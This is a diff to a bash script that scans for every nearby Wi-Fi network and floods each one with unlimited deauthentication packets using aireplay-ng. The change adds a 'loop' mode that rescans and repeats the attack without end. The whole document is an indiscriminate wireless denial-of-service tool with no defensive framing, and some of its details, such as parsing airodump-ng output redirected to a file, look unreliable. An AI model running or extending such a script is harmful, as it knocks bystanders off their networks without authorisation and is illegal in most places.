@@ -56,6 +56,14 @@ fi
 
 INTERFACE=$1
 
+# Check if user specified a loop parameter
+if [ "$2" == "loop" ]
+then
+    LOOP=true
+else
+    LOOP=false
+fi
+
 # Check if necessary tools are installed
 install_package airmon-ng
 install_package airodump-ng
@@ -71,9 +79,20 @@ airodump-ng ${INTERFACE}mon > networks.txt
 bssids=$(awk '/BSSID/ {getline; print $2}' networks.txt)
 
 # Send deauthentication packets to all devices on each network
-for bssid in $bssids
-do
-    aireplay-ng --deauth 0 -a $bssid ${INTERFACE}mon
+while true; do
+    for bssid in $bssids
+    do
+        aireplay-ng --deauth 0 -a $bssid ${INTERFACE}mon
+    done
+
+    # If the loop parameter is not set, break the loop after the first iteration
+    if ! $LOOP; then
+        break
+    fi
+
+    # Rescan for networks and update the list of BSSIDs
+    airodump-ng ${INTERFACE}mon > networks.txt
+    bssids=$(awk '/BSSID/ {getline; print $2}' networks.txt)
 done
 
 echo "========================================================"
